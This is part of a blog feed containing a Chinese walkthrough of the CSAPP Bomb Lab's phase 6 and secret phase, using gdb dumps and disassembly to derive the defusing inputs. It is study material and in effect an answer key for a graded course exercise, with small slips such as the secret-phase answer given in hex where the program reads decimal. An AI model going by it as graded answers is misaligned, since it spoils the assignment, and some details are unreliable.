8</li>\n</ol>\n<p>因为 seg 9 离终点更近，因此我们首先分析 seg 8，也就是<code>7 - str[i] &gt; 1 -&gt; value &lt; 6</code>的情况。</p>\n<ol>\n<li><code>rdx = *(rdx + 8)</code>，也就是说<code>rdx</code>的值 &#x3D; 离<code>rdx</code>8 个字节的位置的值(大概率是个指针，因为需要解引，而且指针是 8 个字节对齐)</li>\n<li><code>eax += 1</code>，将<code>ecx</code>和<code>eax</code>比较（这里 eax 已经从 2 开始了），如果<code>eax</code>还不等于<code>ecx</code>，那么回到 seg 8，否则到 seg 10</li>\n</ol>\n<p>seg 8 的含义为，从第一个差开始，如果当前这个差的值 &gt; 0x1 的话，一直寻找这个差的值的位置，保存在<code>rdx</code>中，并且这个差的值在<code>rax</code>中。</p>\n<p>同时我们来分析 seg 9，seg 9 中<code>edx = 0x6032d0</code>，直接进入 seg 10</p>\n<p>seg 10 的操作是：</p>\n<ol>\n<li><code>*(rsp + rsi * 2 + 32) = rdx</code>,这里 rsi 的值 &#x3D; 之前计算出的索引值（最开始是 0），rsp 的值 &#x3D; 输入数字的位置</li>\n<li><code>rsi = rsi + 4</code></li>\n<li>将<code>rsi</code>和 24 比较，如果<code>rsi != 24</code>，即所有数字还没遍历完，退回到 seg 11</li>\n<li>否则进入 seg 12</li>\n</ol>\n<p>那么总结来说，这三个段的含义如下：</p>\n<ol>\n<li>seg 11 让<code>ecx = str[rsi]</code>，将其和<code>0x1</code>作比较</li>\n<li>当<code>ecx &lt;= 0x1</code>时，跳转到 seg 9，令<code>edx = 0x6032d0</code>，随后进入 seg 10</li>\n<li>当<code>ecx &gt; 0x1</code>时，<code>eax = 1, edx = 0x6032d0</code>，跳转到 seg 8，seg 8 中从第一个值开始一直寻找第<code>ecx</code>个值的位置，并保存在<code>rdx</code>中，进入 seg 10</li>\n<li>seg 10 中我们把该数字的地址都存储在<code>*(起始地址 + 2 * 索引 + 32)</code>位置处，如果数字遍历完了，就进入 seg 12，否则就回退到 seg 11</li>\n</ol>\n<p>大概明白了，这里作者可能是想构建一个链表，他把链表的所有结点的起始地址放在一个数组里了！放置的顺序是我们输入的数字串的顺序！比如<code>rsi = 0</code>时，读入第<code>ecx</code>个数字，那么根据这个数字找到的<code>edx</code>就存储在地址数组的第一行。每个数字的地址都存储在<code>起始地址 + 32 + 2 * 索引</code>的位置。（为什么是这个还不太理解）</p>\n<p>到这里结束，6 个数字的位置分别存储的<code>rsi</code>是：<code>0 4 8 12 16 20 24</code>，其偏移量是<code>0 8 16 25 32 40 48</code>,加上 32 后相距<code>rsp</code>的偏移量是：<code>32 40 48 57 72 80</code></p>\n<p>我们从<code>0x6032d0</code>开始，每次打印 16 个字节（小端序），前 8 个字节是数字的值，后 8 个字节是下一个结点的地址，其顺序如下：<br>第一个结点从<code>0x6032d0</code>开始：</p>\n<pre><code>(gdb) x/16xb 0x6032d0\n0x6032d0 &lt;node1&gt;:       0x4c    0x01    0x00    0x00    0x01    0x00    0x00    0x00\n0x6032d8 &lt;node1+8&gt;:     0xe0    0x32    0x60    0x00    0x00    0x00    0x00    0x00\n</code></pre>\n<p>那么第二个结点的地址应该是<code>0x6032e0</code>：</p>\n<pre><code>(gdb) x/16xb 0x6032e0\n0x6032e0 &lt;node2&gt;:       0xa8    0x00    0x00    0x00    0x02    0x00    0x00    0x00\n0x6032e8 &lt;node2+8&gt;:     0xf0    0x32    0x60    0x00    0x00    0x00    0x00    0x00\n</code></pre>\n<p>第三个结点的地址应该是<code>0x6032f0</code>：</p>\n<pre><code>(gdb) x/16xb 0x6032f0\n0x6032f0 &lt;node3&gt;:       0x9c    0x03    0x00    0x00    0x03    0x00    0x00    0x00\n0x6032f8 &lt;node3+8&gt;:     0x00    0x33    0x60    0x00    0x00    0x00    0x00    0x00\n</code></pre>\n<p>第四个结点的地址应该是<code>0x603300</code>：</p>\n<pre><code>(gdb) x/16xb 0x603300\n0x603300 &lt;node4&gt;:       0xb3    0x02    0x00    0x00    0x04    0x00    0x00    0x00\n0x603308 &lt;node4+8&gt;:     0x10    0x33    0x60    0x00    0x00    0x00    0x00    0x00\n</code></pre>\n<p>第五个结点的地址应该是<code>0x603310</code>：</p>\n<pre><code>0x603310 &lt;node5&gt;:       0xdd    0x01    0x00    0x00    0x05    0x00    0x00    0x00\n0x603318 &lt;node5+8&gt;:     0x20    0x33    0x60    0x00    0x00    0x00    0x00    0x00\n</code></pre>\n<p>第六个结点的地址应该是<code>0x603320</code>：</p>\n<pre><code>(gdb) x/16xb 0x603320\n0x603320 &lt;node6&gt;:       0xbb    0x01    0x00    0x00    0x06    0x00    0x00    0x00\n0x603328 &lt;node6+8&gt;:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00\n</code></pre>\n<h3 id=\"Proc-5\"><a href=\"#Proc-5\" class=\"headerlink\" title=\"Proc 5\"></a>Proc 5</h3><p>在这个子过程中，我们首先进入 seg12，经过一个看起来是循环的东西，再从 seg 14 出去。</p>\n<p>seg 12 的过程如下：</p>\n<ol>\n<li><code>rbx = *(rsp + 32)</code> &#x2F;&#x2F; rbx &#x3D; 起始位置的值（链表第一个结点的地址）</li>\n<li><code>rax = rsp + 40</code> &#x2F;&#x2F; 第 2 个值（链表第二个结点的地址）的位置</li>\n<li><code>rsi = rsp + 80</code> &#x2F;&#x2F; 最后一个数（最后一个结点的地址）的位置</li>\n<li><code>rcx = rbx</code> &#x2F;&#x2F; rcx &#x3D; rbx &#x3D; 起始位置的值（第一个结点的地址）</li>\n</ol>\n<p>随后进入 seg 13，seg 13 的过程如下：</p>\n<ol>\n<li><code>rdx = *rax</code> &#x2F;&#x2F; rdx &#x3D; rax 位置的值</li>\n<li><code>*(rcx + 8) = rdx</code> &#x2F;&#x2F; rcx 指向的下一个位置的值是 rdx</li>\n<li><code>rax += 8</code> &#x2F;&#x2F; rax &#x3D; 下一个位置</li>\n<li>如果 rax &#x3D;&#x3D; rsi，进入 seg 14，否则<code>rcx = rdx</code>，重新回到 seg 13</li>\n</ol>\n<blockquote>\n<p>这里把链表中的结点都串起来啦！</p>\n</blockquote>\n<p>seg 14 的过程如下：</p>\n<ol>\n<li><code>*(rdx + 8) = 0</code> &#x2F;&#x2F; 把链表最后一个节点的 next 域置为 0</li>\n<li><code>ebp = 5</code></li>\n</ol>\n<p>随后进入 seg 15。</p>\n<blockquote>\n<p>现在 rbx 的值等于链表第一个结点的地址，rcx 的值等于链表倒数第二个结点的地址，rdx 的值等于链表最后一个结点的地址，rsi 和 rax 指向链表的最后，ebp &#x3D; 5</p>\n</blockquote>\n<h3 id=\"Proc-6\"><a href=\"#Proc-6\" class=\"headerlink\" title=\"Proc 6\"></a>Proc 6</h3><p>seg 15 中完成了以下步骤：</p>\n<ol>\n<li><code>rax = *(rbx + 8)</code></li>\n<li><code>eax = *rax</code></li>\n<li>如果 <code>*rbx &gt;= eax</code>，进入 seg 16</li>\n<li>否则炸弹爆炸</li>\n</ol>\n<p>这里说明第一个结点的值必须大于等于第二个结点，否则炸弹爆炸。</p>\n<p>seg 16 中执行以下步骤：</p>\n<ol>\n<li><code>rbx = *(rbx + 8)</code></li>\n<li>ebp -&#x3D; 1</li>\n<li>如果 ebp !&#x3D; 0，进入 seg 15</li>\n<li>否则栈恢复</li>\n</ol>\n<p>这段说明链表的值从开始到后面必须严格递减。我们在前期已经获得了链表各个结点的值，我们只需要从大到小排列这些值即可，炸弹的密码是排列的顺序。这组值是<code>0x014c 0x00a8 0x039c 0x02b3 0x01dd 0x01bb</code>，翻译成十进制就是<code>332 168 924 691 477 443</code>(可以使用<code>x/96dh 0x6032d0</code>打印<code>halfword</code>)，gdb 的 x 命令打印的字节数如下：</p>\n<pre><code>b - byte\nh - halfword (16-bit value)\nw - word (32-bit value)\ng - giant word (64-bit value)\n</code></pre>\n<p>所以数字从大到小的顺序应该是<code>3 4 5 6 1 2</code>，但是因为<code>ecx</code>的值是<code>7 - 原来的值</code>，所以原来的值应该是<code>4 3 2 1 6 5</code>。成功解除炸弹！</p>\n<blockquote>\n<p>重点：</p>\n<ol>\n<li>这个过程就是第<code>ecx</code>个数的<code>rdx</code>（链表结点地址）存储在地址数组的第<code>rsi</code>位，实现了链表结点的重排序！</li>\n<li>最后记得第<code>ecx</code>个数 &#x3D; 7 - 原来的值，所以我们解出了链表中元素的值后，还要用 7 - 它 来获得我们原来输入的数</li>\n</ol>\n</blockquote>\n<h2 id=\"secret-phase-分析\"><a href=\"#secret-phase-分析\" class=\"headerlink\" title=\"secret phase 分析:\"></a>secret phase 分析:</h2><p>对<code>secret phase</code>执行反汇编得到如下结果：</p>\n<pre><code>0000000000401242 &lt;secret_phase&gt;:\nseg1:\n  401242:\t53                   \tpush   %rbx\n  401243:\te8 56 02 00 00       \tcallq  40149e &lt;read_line&gt;\n  401248:\tba 0a 00 00 00       \tmov    $0xa,%edx\n  40124d:\tbe 00 00 00 00       \tmov    $0x0,%esi\n  401252:\t48 89 c7             \tmov    %rax,%rdi\n  401255:\te8 76 f9 ff ff       \tcallq  400bd0 &lt;strtol@plt&gt;\n  40125a:\t48 89 c3             \tmov    %rax,%rbx\n  40125d:\t8d 40 ff             \tlea    -0x1(%rax),%eax\n  401260:\t3d e8 03 00 00       \tcmp    $0x3e8,%eax\n  401265:\t76 05                \tjbe    40126c &lt;secret_phase+0x2a&gt;\n  401267:\te8 ce 01 00 00       \tcallq  40143a &lt;explode_bomb&gt;\nseg2:\n  40126c:\t89 de                \tmov    %ebx,%esi\n  40126e:\tbf f0 30 60 00       \tmov    $0x6030f0,%edi\n  401273:\te8 8c ff ff ff       \tcallq  401204 &lt;fun7&gt;\n  401278:\t83 f8 02             \tcmp    $0x2,%eax\n  40127b:\t74 05                \tje     401282 &lt;secret_phase+0x40&gt;\n  40127d:\te8 b8 01 00 00       \tcallq  40143a &lt;explode_bomb&gt;\nseg3:\n  401282:\tbf 38 24 40 00       \tmov    $0x402438,%edi\n  401287:\te8 84 f8 ff ff       \tcallq  400b10 &lt;puts@plt&gt;\n  40128c:\te8 33 03 00 00       \tcallq  4015c4 &lt;phase_defused&gt;\n  401291:\t5b                   \tpop    %rbx\n  401292:\tc3                   \tretq\n</code></pre>\n<p>其过程如下：</p>\n<ol>\n<li>压入<code>%rbx</code></li>\n<li>读入一行 -&gt; 估计结果存储在 rax 中，也就是字符串的起始位置</li>\n<li><code>edx = 0xa</code>，<code>esi = 0</code>，<code>rdi = rax</code></li>\n<li>调用<code>strtol</code></li>\n<li><code>rbx = rax</code> -&gt; rbx &#x3D; 字符串转化出的数值</li>\n<li><code>eax = rax - 1</code></li>\n<li>如果<code>eax &lt;= 0x3e8</code>，跳转到 seg 2；否则炸弹爆炸</li>\n<li><code>esi = ebx</code>，<code>edi = 0x6030f0</code>，调用<code>fun7</code></li>\n<li>如果<code>eax == 0x2</code>，跳转到 seg 3（炸弹解除），否则炸弹爆炸</li>\n</ol>\n<p>将其转化为 C 语言：</p>\n<pre><code class=\"c\">int secret_phase(char* buf)\n&#123;\n    // 压入rbx\n    rax = call read_line\n    edx = 0xa\n    esi = 0\n    rdi = rax\n    call strtol\n    rbx = rax\n    eax = rax - 1 //输入数字必须小于等于 1000\n    if(eax &lt;= 0x3e8) &#123;\n        // seg2\n        esi = ebx\n        edi = 0x6030f0\n        call fun7\n        if(eax == 0x2) &#123;\n            return eax;\n        &#125;\n        else &#123;\n            call bomb_explode\n        &#125;\n    &#125;\n    else &#123;\n        call bomb_explode\n    &#125;\n&#125;\n</code></pre>\n<p>我们首先解读一下<code>secret_phase</code>：<br>一开始几个寄存器的值如下：</p>\n<pre><code>rax - read line 返回的字符串地址\nedx - 0xa\nesi - 0\nrdi - read line 返回的字符串地址\n</code></pre>\n<p>调用<code>strtol</code>后几个寄存器的值如下：</p>\n<pre><code>rax - strtol 返回的字符串转化出的数值\nrbx - strtol 返回的字符串转化出的数值\neax - 数值 - 1\n</code></pre>\n<p>如果该数值 - 1 &gt; 0x3e8(1000)，炸弹爆炸，否则进入 seg 2。</p>\n<p>seg 2 中完成了如下工作：</p>\n<ol>\n<li><code>esi = strtol 返回的字符串转化出的数值</code>（这个数必须小于等于 1001）</li>\n<li><code>edi = 0x6030f0</code>(一个地址)</li>\n<li>调用<code>fun7</code></li>\n<li>如果<code>fun7</code>返回 2，退出，否则炸弹爆炸</li>\n</ol>\n<p>这其中调用了一个叫<code>fun7</code>的函数，其反汇编结果如下：</p>\n<pre><code>0000000000401204 &lt;fun7&gt;:\nseg1:\n  401204:\t48 83 ec 08          \tsub    $0x8,%rsp\n  401208:\t48 85 ff             \ttest   %rdi,%rdi\n  40120b:\t74 2b                \tje     401238 &lt;fun7+0x34&gt;\n  40120d:\t8b 17                \tmov    (%rdi),%edx\n  40120f:\t39 f2                \tcmp    %esi,%edx\n  401211:\t7e 0d                \tjle    401220 &lt;fun7+0x1c&gt;\n  401213:\t48 8b 7f 08          \tmov    0x8(%rdi),%rdi\n  401217:\te8 e8 ff ff ff       \tcallq  401204 &lt;fun7&gt;\n  40121c:\t01 c0                \tadd    %eax,%eax\n  40121e:\teb 1d                \tjmp    40123d &lt;fun7+0x39&gt;\nseg2:\n  401220:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  401225:\t39 f2                \tcmp    %esi,%edx\n  401227:\t74 14                \tje     40123d &lt;fun7+0x39&gt;\n  401229:\t48 8b 7f 10          \tmov    0x10(%rdi),%rdi\n  40122d:\te8 d2 ff ff ff       \tcallq  401204 &lt;fun7&gt;\n  401232:\t8d 44 00 01          \tlea    0x1(%rax,%rax,1),%eax\n  401236:\teb 05                \tjmp    40123d &lt;fun7+0x39&gt;\nseg3:\n  401238:\tb8 ff ff ff ff       \tmov    $0xffffffff,%eax\nseg4:\n  40123d:\t48 83 c4 08          \tadd    $0x8,%rsp\n  401241:\tc3                   \tretq\n</code></pre>\n<p>根据反汇编可以看出<code>%rdi</code>(<code>0x6030f0</code>)和<code>%esi</code>(输入的数值)是传入参数，<code>%eax</code>是返回值。其中还包括了一次递归调用。<code>fun7</code>的 C 语言实现如下：</p>\n<pre><code class=\"c\">int fun7()\n&#123;\n    // rsp留出8个字节的空间\n    if(rdi == 0) &#123;\n        // seg3\n        eax = 0xffffffff\n    &#125;\n    else &#123;\n        edx = *rdi\n        if(edx &lt;= esi) &#123;\n            // seg2\n            eax = 0\n            if(edx != esi) &#123;\n                rdi = *(rdi + 16)\n                call fun7\n                eax = 2 * rax + 1\n            &#125;\n        &#125;\n        else &#123;\n            rdi = *(rdi + 8)\n            call fun7\n            eax = eax * 2\n        &#125;\n    &#125;\n    // seg4\n    // rsp栈空间恢复\n    return eax;\n&#125;\n</code></pre>\n<p><code>fun7</code>的内容翻译成 C 语言是如下内容：</p>\n<ol>\n<li>如果传入的<code>rdi = 0</code>，那么返回<code>0xffffffff</code></li>\n<li>否则，<code>edx</code>的值为<code>rdi</code>指向地址的值。</li>\n<li>如果<code>edx &gt; 传入的esi</code>，rdi 跳转到下一个位置（左节点的值）（这里大概率又是个链表），返回<code>2 * fun7()</code></li>\n<li>否则，<code>eax = 0</code>，如果<code>edx == 传入的esi</code>，返回 0；否则就跳转到下下个位置（右节点的值），返回<code>2 * fun7() + 1</code></li>\n</ol>\n<p>为什么能推测出来这里的左节点和右节点呢？我们在<code>0x6030f0</code>打印 32 个字节的值看看：</p>\n<pre><code>(gdb) x/32bx 0x6030f0\n0x6030f0 &lt;n1&gt;:          0x24    0x00    0x00    0x00    0x00    0x00    0x00    0x00\n0x6030f8 &lt;n1+8&gt;:        0x10    0x31    0x60    0x00    0x00    0x00    0x00    0x00\n0x603100 &lt;n1+16&gt;:       0x30    0x31    0x60    0x00    0x00    0x00    0x00    0x00\n</code></pre>\n<p>这里有 n+8 和 n+16，可以看出来这也是两个地址。</p>\n<p>这里对<code>fun7</code>的要求是必须在传入地址的值为<code>0x6030f0</code>，输入的<code>%esi &lt;= 1000</code>的情况下返回 2。</p>\n<p>我们打印一下这个链表各个结点的值：</p>\n<pre><code>(gdb) x/32bx 0x6030f0\n0x6030f0 &lt;n1&gt;:          0x24    0x00    0x00    0x00    0x00    0x00    0x00    0x00\n0x6030f8 &lt;n1+8&gt;:        0x10    0x31    0x60    0x00    0x00    0x00    0x00    0x00\n0x603100 &lt;n1+16&gt;:       0x30    0x31    0x60    0x00    0x00    0x00    0x00    0x00\n</code></pre>\n<p>我们打印它左节点(node 21)：</p>\n<pre><code>(gdb) x/32bx 0x603110\n0x603110 &lt;n21&gt;: 0x08    0x00    0x00    0x00    0x00    0x00    0x00    0x00\n0x603118 &lt;n21+8&gt;:       0x90    0x31    0x60    0x00    0x00    0x00    0x00    0x00\n0x603120 &lt;n21+16&gt;:      0x50    0x31    0x60    0x00    0x00    0x00    0x00    0x00\n0x603128:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00\n</code></pre>\n<p>再打印右节点(node 22)：</p>\n<pre><code>(gdb) x/32bx 0x603130\n0x603130 &lt;n22&gt;: 0x32    0x00    0x00    0x00    0x00    0x00    0x00    0x00\n0x603138 &lt;n22+8&gt;:       0x70    0x31    0x60    0x00    0x00    0x00    0x00    0x00\n0x603140 &lt;n22+16&gt;:      0xb0    0x31    0x60    0x00    0x00    0x00    0x00    0x00\n0x603148:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00\n</code></pre>\n<p>现在的迷惑之处在于<code>fun7</code>到底返回的是什么东西。从<code>fun7</code>的内容来看，其主要目的是一直找到<code>esi</code>的值在二叉树中的位置。如果<code>esi &lt; edx</code>，就找左边那颗二叉树，返回<code>2 * fun7()</code>，否则就找右边那颗二叉树，返回<code>2 * fun7() + 1</code>。从<code>0x6030f0</code>这个位置开始找，最后<code>fun7()</code>必须返回 2。从我们之前学习数据结构的经验来说，如果一个结点的标号为 n，那么它的左孩子就是 2 _ n,右孩子就是 2 _ n + 1。</p>\n<p>二叉树的结构如下：</p>\n<p><img data-src=\"/blog/2024/02/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Bomb%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/fun7.png\" alt=\"fun7\"></p>\n<p>那么首先<code>edx</code>的值为根节点的地址，我们从根开始遍历，一直到<code>%esi</code>的值所在的位置。我们对每个结点进行排查，那么能让最后返回 2 的<code>%esi</code>只有 0x16 和 0x14。</p>\n<p>但是<code>secret_phase</code>在哪里启动呢？我们来看看！欸，在<code>phase_defused</code>中启动！我们看到在<code>callq secret_phase</code>前有这样一段代码：</p>\n<pre><code>  401621:\tbf 20 25 40 00       \tmov    $0x402520,%edi\n  401626:\te8 e5 f4 ff ff       \tcallq  400b10 &lt;puts@plt&gt;\n  40162b:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  401630:\te8 0d fc ff ff       \tcallq  401242 &lt;secret_phase&gt;\n</code></pre>\n<p>这段汇编首先把一个看起来像地址的<code>0x402520</code>放进了<code>%edi</code>寄存器，然后调用<code>puts</code>，将<code>eax</code>设置为 0。我们来看看<code>0x402520</code>处放了啥：</p>\n<pre><code>(gdb) x/s 0x402520\n0x402520:       &quot;But finding it and solving it are quite different...&quot;\n</code></pre>\n<p>这个地址是否出现在别的地方呢？好像没有。但是这段代码后面还有一段：</p>\n<pre><code>  401626:\te8 e5 f4 ff ff       \tcallq  400b10 &lt;puts@plt&gt;\n  40162b:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  401630:\te8 0d fc ff ff       \tcallq  401242 &lt;secret_phase&gt;\n  401635:\tbf 58 25 40 00       \tmov    $0x402558,%edi\n  40163a:\te8 d1 f4 ff ff       \tcallq  400b10 &lt;puts@plt&gt;\n  40163f:\t48 8b 44 24 68       \tmov    0x68(%rsp),%rax\n  401644:\t64 48 33 04 25 28 00 \txor    %fs:0x28,%rax\n</code></pre>\n<p>这里又出现了一个新地址，<code>0x402558</code>，我们来看看这里是啥：</p>\n<pre><code>(gdb) x/s 0x402558\n0x402558:       &quot;Congratulations! You&#39;ve defused the bomb!&quot;\n</code></pre>\n<p>额，是恭喜我们拆除炸弹。。。</p>\n<p>我想这么看可能是看不出来的，那么我们来把<code>phase_defused</code>详细拆解看看(nop 指令省去)：</p>\n<pre><code>00000000004015c4 &lt;phase_defused&gt;:\nseg1:\n  4015c4:\t48 83 ec 78          \tsub    $0x78,%rsp -&gt; 留出栈位置\n  4015c8:\t64 48 8b 04 25 28 00 \tmov    %fs:0x28,%rax\n  4015cf:\t00 00\n  4015d1:\t48 89 44 24 68       \tmov    %rax,0x68(%rsp) -&gt; *(rsp + 104) = rax\n  4015d6:\t31 c0                \txor    %eax,%eax -&gt; 将eax置0\n  4015d8:\t83 3d 81 21 20 00 06 \tcmpl   $0x6,0x202181(%rip)        # 603760 &lt;num_input_strings&gt;\n  4015df:\t75 5e                \tjne    40163f &lt;phase_defused+0x7b&gt;\n  4015e1:\t4c 8d 44 24 10       \tlea    0x10(%rsp),%r8\n  4015e6:\t48 8d 4c 24 0c       \tlea    0xc(%rsp),%rcx\n  4015eb:\t48 8d 54 24 08       \tlea    0x8(%rsp),%rdx\n  4015f0:\tbe 19 26 40 00       \tmov    $0x402619,%esi\n  4015f5:\tbf 70 38 60 00       \tmov    $0x603870,%edi\n  4015fa:\te8 f1 f5 ff ff       \tcallq  400bf0 &lt;__isoc99_sscanf@plt&gt;\n  4015ff:\t83 f8 03             \tcmp    $0x3,%eax\n  401602:\t75 31                \tjne    401635 &lt;phase_defused+0x71&gt;\n  401604:\tbe 22 26 40 00       \tmov    $0x402622,%esi\n  401609:\t48 8d 7c 24 10       \tlea    0x10(%rsp),%rdi\n  40160e:\te8 25 fd ff ff       \tcallq  401338 &lt;strings_not_equal&gt;\n  401613:\t85 c0                \ttest   %eax,%eax\n  401615:\t75 1e                \tjne    401635 &lt;phase_defused+0x71&gt;\n  401617:\tbf f8 24 40 00       \tmov    $0x4024f8,%edi\n  40161c:\te8 ef f4 ff ff       \tcallq  400b10 &lt;puts@plt&gt;\n  401621:\tbf 20 25 40 00       \tmov    $0x402520,%edi\n  401626:\te8 e5 f4 ff ff       \tcallq  400b10 &lt;puts@plt&gt;\n  40162b:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  401630:\te8 0d fc ff ff       \tcallq  401242 &lt;secret_phase&gt;\nseg2:\n  401635:\tbf 58 25 40 00       \tmov    $0x402558,%edi\n  40163a:\te8 d1 f4 ff ff       \tcallq  400b10 &lt;puts@plt&gt;\nseg3:\n  40163f:\t48 8b 44 24 68       \tmov    0x68(%rsp),%rax\n  401644:\t64 48 33 04 25 28 00 \txor    %fs:0x28,%rax\n  40164b:\t00 00\n  40164d:\t74 05                \tje     401654 &lt;phase_defused+0x90&gt;\n  40164f:\te8 dc f4 ff ff       \tcallq  400b30 &lt;__stack_chk_fail@plt&gt;\nseg4:\n  401654:\t48 83 c4 78          \tadd    $0x78,%rsp\n  401658:\tc3                   \tretq\n</code></pre>\n<p>其中 seg 3 和 4 主要是一些收尾工作（检查<code>canary</code>的值之类的），seg2 是打印恭喜字符串，其核心部分在 seg 1。</p>\n<p>seg 1 的工作如下：</p>\n<ol>\n<li>留出栈的位置，放置<code>canary</code></li>\n<li>获取输入的字符串的个数，如果不等于 6，跳转到收尾工作</li>\n<li>设置以下几个值：<pre><code> 4015e1:\t4c 8d 44 24 10       \tlea    0x10(%rsp),%r8 // r8 = rsp + 16\n 4015e6:\t48 8d 4c 24 0c       \tlea    0xc(%rsp),%rcx // rcx = rsp + 12\n 4015eb:\t48 8d 54 24 08       \tlea    0x8(%rsp),%rdx // rdx = rsp + 8\n 4015f0:\tbe 19 26 40 00       \tmov    $0x402619,%esi // esi = 0x402619\n 4015f5:\tbf 70 38 60 00       \tmov    $0x603870,%edi // edi = 0x603870\n</code></pre>\n这里<code>0x402619</code>是<code>sscanf</code>的格式化输入的字符串的保存地址：<pre><code>0x402619:       &quot;%d %d %s&quot;\n</code></pre>\n而<code>0x603870</code>是输入的字符串的保存地址：<pre><code>(gdb) x/s 0x603870\n 0x603870 &lt;input_strings+240&gt;:   &quot;&quot;\n</code></pre>\n</li>\n<li>调用 sscanf 获取输入字符串，其个数存储在<code>%eax</code>中，判断其是否等于 3，如果不是进入收尾工作</li>\n<li>接下来我们需要判断<code>0x402622</code>处的字符串和输入的字符串是否相等，该处的字符串为<code>DrEvil</code>，如果相等的话，打印如下指令，然后进入 secret phase:</li>\n</ol>\n<pre><code>(gdb) x/s 0x4024f8\n0x4024f8:       &quot;Curses, you&#39;ve found the secret phase!&quot;\n(gdb) x/s 0x402520\n0x402520:       &quot;But finding it and solving it are quite different...&quot;\n</code></pre>\n<p>但是什么时候会<code>sscanf</code>到<code>0x603870</code>处呢？只有<code>phase_3</code>和<code>phase_4</code>调用了<code>sscanf</code>，且输入的字符串的地址都存储在<code>$rdi</code>中，我们对他们打断点进行分析看看：</p>\n<pre><code>Breakpoint 1, 0x0000000000400f43 in phase_3 ()\n(gdb) p $rdi\n$1 = 6305824\n(gdb) p /x $rdi\n$2 = 0x603820\n(gdb) n\nSingle stepping until exit from function phase_3,\nwhich has no line number information.\nmain (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at bomb.c:90\nwarning: Source file is more recent than executable.\n90          /* I guess this is too easy so far.  Some more complex code will\n(gdb)\n91           * confuse people. */\n(gdb)\nHalfway there!\n94          phase_defused();\n(gdb)\n0 207\n95          printf(&quot;Halfway there!\\n&quot;);\n(gdb) n\n\nBreakpoint 2, 0x000000000040100c in phase_4 ()\n(gdb) p /x $rdi\n$3 = 0x603870\n</code></pre>\n<p>在<code>phase_4</code>中<code>$rdi = 0x603870</code>，这个字符串是在这里输入的！那么这里应该输入第三个字符串来触发 secret_phase，也就是<code>DrEvil</code>，并且 secret phase 的答案是 0x16 和 0x14。</p>\n<p>最后成功啦！</p>\n<pre><code>Welcome to my fiendish little bomb. You have 6 phases with\nwhich to blow yourself up. Have a nice day!\nPhase 1 defused. How about the next one?\nThat&#39;s number 2.  Keep going!\nHalfway there!\nSo you got that one.  Try this one.\nGood work!  On to the next...\nCurses, you&#39;ve found the secret phase!\nBut finding it and solving it are quite different...\nWow! You&#39;ve defused the secret stage!\nCongratulations! You&#39;ve defused the bomb!\n</code></pre>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><ol>\n<li><code>Phase 1 - 3</code> 还好</li>\n<li><code>Phase 3</code>那个需要传入 10 进制数，而不是 16 进制，写答案的时候不要写错了</li>\n<li><code>Phase 4</code>那个<code>func</code>没看出来是啥，蒙了个<code>0 0</code>过了，需要搞懂</li>\n<li><code>Phase 5</code>一开始没想到给那几个 16 进制的值加偏移量，使其为合法的<code>ASCII码</code>字符，是后来加查了 1 个题解晓得的。</li>\n<li><code>Phase 6</code>费大力气终于解决啦！当然我一开始没留意到是第<code>ecx</code>个数的<code>rdx</code>存储在地址数组的第<code>rsi</code>位，所以还以为链表的结点都是顺序排列的。解除 phase6 的经历也告诉我，看见汇编不要一开始上来就将它转化成 C 语言，要首先根据跳转目标对其进行分段，用流程图分析他的跳转，然后再将其拆解为各个小的过程（拆解的过程中尽量把循环放在一起，控制一下过程的规模），一步步的分析他，不要一上来就看题解&#x2F;暴力反汇编。而且要留意题意！比如第 5 题那个 ASCII 码字符，第 6 题要把顺序转化为<code>7 - 原来的值</code>，这都是容易做错的地方。</li>\n<li><code>secret_phase</code>顺利完结！二叉树的结构精妙极了！但是<code>secret_phase</code>的入口不好找，因为输入的字符串都在<code>%rdi</code>中，需要通过<code>gdb</code>查看哪个 phase 的 rdi 寄存器的值 &#x3D; 0x603870，这点很难。</li>\n</ol>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80NTE2MjM1NzQ=\">手把手教你拆解 CSAPP 的 炸弹实验室 BombLab</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC81NjEwNjg0NDU=\">CSAPP bomblab 隐藏关卡 secret_phase 拆弹记录</span></li>\n</ul>\n",
            "tags": []
        },
        {
            "id": "https://salvely.github.io/blog/2024/02/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Data%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/",
            "url": "https://salvely.github.io/blog/2024/02/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Data%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/",
            "title": "15213 Lab 1-data lab 实验记录",
            "date_published": "2024-02-05T07:50:22.000Z",
